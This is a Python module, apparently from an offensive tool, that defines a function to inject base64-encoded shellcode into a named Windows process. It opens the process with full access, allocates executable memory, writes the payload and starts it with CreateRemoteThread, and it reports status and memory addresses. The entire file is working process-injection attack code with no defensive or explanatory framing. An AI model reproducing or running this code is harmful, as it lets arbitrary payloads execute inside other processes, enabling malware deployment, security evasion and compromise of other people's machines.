import ctypes
import logging
import psutil
from datetime import datetime
import platform
import base64

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def validate_shellcode(shellcode_b64):
    """Validate base64 encoded shellcode"""
    try:
        decoded = base64.b64decode(shellcode_b64)
        if len(decoded) == 0:
            return False, "Empty shellcode"
        return True, decoded
    except Exception as e:
        return False, f"Invalid base64 shellcode: {str(e)}"

def inject_shellcode(process_name, shellcode_b64):
    """Inject shellcode into a target process"""
    try:
        # Validate inputs
        if not process_name:
            return {
                'status': 'error',
                'error': 'Process name is required',
                'timestamp': datetime.now().isoformat()
            }
        
        # Validate shellcode
        valid, result = validate_shellcode(shellcode_b64)
        if not valid:
            return {
                'status': 'error',
                'error': result,
                'timestamp': datetime.now().isoformat()
            }
        shellcode = result
        
        if platform.system() != 'Windows':
            return {
                'status': 'error',
                'error': 'Shellcode injection only supported on Windows',
                'timestamp': datetime.now().isoformat()
            }
            
        logging.info(f"Attempting to inject shellcode into process: {process_name}")
            
        # Required Windows API functions
        kernel32 = ctypes.windll.kernel32
        OpenProcess = kernel32.OpenProcess
        VirtualAllocEx = kernel32.VirtualAllocEx
        WriteProcessMemory = kernel32.WriteProcessMemory
        CreateRemoteThread = kernel32.CreateRemoteThread
        CloseHandle = kernel32.CloseHandle
        
        # Constants
        PROCESS_ALL_ACCESS = 0x1F0FFF
        MEM_COMMIT = 0x1000
        MEM_RESERVE = 0x2000
        PAGE_EXECUTE_READWRITE = 0x40
        
        # Find target process
        target_pid = None
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == process_name.lower():
                target_pid = proc.info['pid']
                break
                
        if not target_pid:
            error_msg = f'Process {process_name} not found'
            logging.error(error_msg)
            return {
                'status': 'error',
                'error': error_msg,
                'timestamp': datetime.now().isoformat()
            }
            
        logging.info(f"Target process found. PID: {target_pid}")
            
        # Open target process
        process_handle = OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
        if not process_handle:
            error_msg = f'Failed to open process {process_name}'
            logging.error(error_msg)
            return {
                'status': 'error',
                'error': error_msg,
                'timestamp': datetime.now().isoformat()
            }
            
        try:
            # Allocate memory in target process
            shellcode_length = len(shellcode)
            memory_address = VirtualAllocEx(
                process_handle,
                None,
                shellcode_length,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            )
            
            if not memory_address:
                error_msg = 'Failed to allocate memory in target process'
                logging.error(error_msg)
                return {
                    'status': 'error',
                    'error': error_msg,
                    'timestamp': datetime.now().isoformat()
                }
                
            logging.info(f"Memory allocated at: {hex(memory_address)}")
                
            # Write shellcode to allocated memory
            write_result = WriteProcessMemory(
                process_handle,
                memory_address,
                shellcode,
                shellcode_length,
                None
            )
            
            if not write_result:
                error_msg = 'Failed to write shellcode to target process'
                logging.error(error_msg)
                return {
                    'status': 'error',
                    'error': error_msg,
                    'timestamp': datetime.now().isoformat()
                }
                
            logging.info("Shellcode written to memory successfully")
                
            # Create remote thread to execute shellcode
            thread_handle = CreateRemoteThread(
                process_handle,
                None,
                0,
                memory_address,
                None,
                0,
                None
            )
            
            if not thread_handle:
                error_msg = 'Failed to create remote thread'
                logging.error(error_msg)
                return {
                    'status': 'error',
                    'error': error_msg,
                    'timestamp': datetime.now().isoformat()
                }
                
            logging.info("Remote thread created successfully")
            
            return {
                'status': 'success',
                'message': f'Shellcode injected into {process_name} (PID: {target_pid})',
                'timestamp': datetime.now().isoformat(),
                'details': {
                    'process_name': process_name,
                    'pid': target_pid,
                    'shellcode_length': shellcode_length,
                    'memory_address': hex(memory_address)
                }
            }
            
        finally:
            CloseHandle(process_handle)
            
    except Exception as e:
        error_msg = f"Error injecting shellcode: {str(e)}"
        logging.error(error_msg)
        return {
            'status': 'error',
            'error': error_msg,
            'timestamp': datetime.now().isoformat()
        } 